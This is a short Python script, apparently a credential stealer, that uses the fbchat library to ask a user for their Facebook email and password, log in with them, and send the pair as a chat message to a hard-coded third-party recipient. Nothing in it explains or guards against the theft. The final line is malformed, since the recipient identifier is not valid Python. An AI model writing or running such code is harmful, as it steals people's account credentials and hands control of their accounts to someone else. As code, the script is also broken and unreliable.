import fbchat
from fbchat import Client
from getpass import getpass
username = str(input("Enter Your Mail::"))
getpass = str(input("Enter Your Pass::"))
message = username+":"+getpass
client = fbchat.Client(username, getpass)
sent = client.send(fbchat.models.Message(message),min.may.loelite.ma.a.loe.69)
